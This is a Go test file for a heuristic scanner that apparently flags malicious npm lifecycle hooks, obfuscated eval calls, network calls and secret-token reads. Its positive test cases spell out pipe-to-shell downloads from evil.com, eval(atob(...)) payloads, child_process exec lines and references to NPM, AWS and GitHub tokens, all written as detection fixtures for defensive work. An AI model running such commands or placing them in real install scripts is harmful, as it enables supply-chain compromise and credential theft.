package heuristic

import (
	"testing"
)

func TestPatternsCompile(t *testing.T) {
	if len(Patterns) == 0 {
		t.Fatal("expected at least one pattern")
	}

	for _, p := range Patterns {
		if p.ID == "" {
			t.Error("pattern has empty ID")
		}

		if p.Title == "" {
			t.Errorf("pattern %s has empty Title", p.ID)
		}

		if p.Regex == nil {
			t.Errorf("pattern %s has nil Regex", p.ID)
		}

		if len(p.Extensions) == 0 {
			t.Errorf("pattern %s has no extensions", p.ID)
		}
	}
}

func TestEvalDecodePattern(t *testing.T) {
	p := findPattern(t, "HEUR-EVAL-DECODE")

	positives := []string{
		`eval(atob("SGVsbG8="))`,
		`eval( Buffer.from("abc", "base64") )`,
		`eval(atob(x))`,
		`Function(atob("payload"))`,
		`Function( Buffer.from(s) )`,
	}

	negatives := []string{
		`atob("SGVsbG8=")`,
		`eval("console.log(1)")`,
		`Buffer.from("abc", "base64")`,
		`Function("return 1")`,
		`console.log(eval)`,
	}

	for _, s := range positives {
		if !p.Regex.MatchString(s) {
			t.Errorf("expected match for: %s", s)
		}
	}

	for _, s := range negatives {
		if p.Regex.MatchString(s) {
			t.Errorf("unexpected match for: %s", s)
		}
	}
}

func TestPipeShellPattern(t *testing.T) {
	p := findPattern(t, "HEUR-PIPE-SHELL")

	positives := []string{
		`curl https://evil.com/payload | sh`,
		`wget -q http://x.com/s | bash`,
		`curl http://foo.bar/x -o- | node`,
		`wget http://a.b/c | zsh`,
	}

	negatives := []string{
		`curl https://registry.npmjs.org/package.tgz -o file.tgz`,
		`wget -q http://example.com/file.tar.gz`,
		`echo hello | grep world`,
	}

	for _, s := range positives {
		if !p.Regex.MatchString(s) {
			t.Errorf("expected match for: %s", s)
		}
	}

	for _, s := range negatives {
		if p.Regex.MatchString(s) {
			t.Errorf("unexpected match for: %s", s)
		}
	}
}

func TestLifecycleExecPattern(t *testing.T) {
	positives := []string{
		`node -e 'require("./x")'`,
		`curl http://evil.com/script.sh`,
		`wget http://evil.com/payload`,
		`eval $(echo payload)`,
	}

	negatives := []string{
		`node scripts/setup.js`,
		`npm run build`,
		`echo hello`,
		`tsc --build`,
	}

	for _, s := range positives {
		if !lifecycleExecPattern.MatchString(s) {
			t.Errorf("expected lifecycle match for: %s", s)
		}
	}

	for _, s := range negatives {
		if lifecycleExecPattern.MatchString(s) {
			t.Errorf("unexpected lifecycle match for: %s", s)
		}
	}
}

func TestSecretEnvVars(t *testing.T) {
	if len(secretEnvVars) == 0 {
		t.Fatal("expected at least one secret env var pattern")
	}

	for _, re := range secretEnvVars {
		if re == nil {
			t.Error("nil secret env var pattern")
		}
	}

	// Verify known vars match.
	content := []byte(`process.env.NPM_TOKEN + process.env.AWS_SECRET_ACCESS_KEY + process.env.GITHUB_TOKEN`)
	count := countSecretEnvVars(content)

	if count != 3 {
		t.Errorf("expected 3 secret env var matches, got %d", count)
	}
}

func TestNetworkCallPattern(t *testing.T) {
	positives := []string{
		`https://example.com`,
		`http://evil.com`,
		`fetch("http://evil.com")`,
		`fetch(url)`,
		`.post(data)`,
		`.get(url)`,
		`require('https')`,
		`require("http")`,
	}

	negatives := []string{
		`console.log("hello")`,
		`const x = 42`,
		`process.env.NODE_ENV`,
	}

	for _, s := range positives {
		if !networkCallPattern.MatchString(s) {
			t.Errorf("expected network match for: %s", s)
		}
	}

	for _, s := range negatives {
		if networkCallPattern.MatchString(s) {
			t.Errorf("unexpected network match for: %s", s)
		}
	}
}

func TestHexLiteralPattern(t *testing.T) {
	long := make([]byte, hexExecThreshold)
	for i := range long {
		long[i] = "0123456789abcdef"[i%16]
	}

	if !hexLiteralPattern.Match(long) {
		t.Error("expected hex literal pattern to match 100-char hex string")
	}

	short := make([]byte, hexExecThreshold-1)
	for i := range short {
		short[i] = "0123456789abcdef"[i%16]
	}

	if hexLiteralPattern.Match(short) {
		t.Error("expected hex literal pattern to NOT match 99-char hex string")
	}
}

func TestExecNearHexPattern(t *testing.T) {
	positives := []string{
		`eval(`,
		`Function (`,
		`exec(`,
	}

	negatives := []string{
		`console.log(`,
		`require(`,
	}

	for _, s := range positives {
		if !execNearHexPattern.MatchString(s) {
			t.Errorf("expected exec match for: %s", s)
		}
	}

	for _, s := range negatives {
		if execNearHexPattern.MatchString(s) {
			t.Errorf("unexpected exec match for: %s", s)
		}
	}
}

func TestBenignPostinstallPattern(t *testing.T) {
	benign := []string{
		`node -e "try{require('./postinstall')}catch(e){}"`,
		`node -e "try{require('./_postinstall')}catch(e){}" || exit 0`,
		`node -e "try{require('./config/scripts/postinstall')}catch(e){}"`,
	}

	suspicious := []string{
		`node -e "require('child_process').exec('curl evil')"`,
		`node -e "eval(atob('payload'))"`,
		`curl http://evil.com/script.sh`,
		`wget http://evil.com/payload`,
	}

	for _, s := range benign {
		if !benignPostinstallPattern.MatchString(s) {
			t.Errorf("expected benign match for: %s", s)
		}
	}

	for _, s := range suspicious {
		if benignPostinstallPattern.MatchString(s) {
			t.Errorf("unexpected benign match for: %s", s)
		}
	}
}

func TestScannableSubdirs(t *testing.T) {
	if len(scannableSubdirs) == 0 {
		t.Fatal("expected at least one scannable subdir")
	}
}

func TestLifecycleHooks(t *testing.T) {
	expected := map[string]bool{
		"preinstall":   true,
		"postinstall":  true,
		"preuninstall": true,
	}

	for _, h := range lifecycleHooks {
		if !expected[h] {
			t.Errorf("unexpected lifecycle hook: %s", h)
		}
	}

	if len(lifecycleHooks) != len(expected) {
		t.Errorf("expected %d lifecycle hooks, got %d", len(expected), len(lifecycleHooks))
	}
}

// countSecretEnvVars counts the number of distinct secret env var patterns
// matching in the given content. Extracted here for testability.
func countSecretEnvVars(content []byte) int {
	count := 0

	for _, re := range secretEnvVars {
		if re.Match(content) {
			count++
		}
	}

	return count
}

func findPattern(t *testing.T, id string) Pattern {
	t.Helper()

	for _, p := range Patterns {
		if p.ID == id {
			return p
		}
	}

	t.Fatalf("pattern %s not found", id)

	return Pattern{}
}
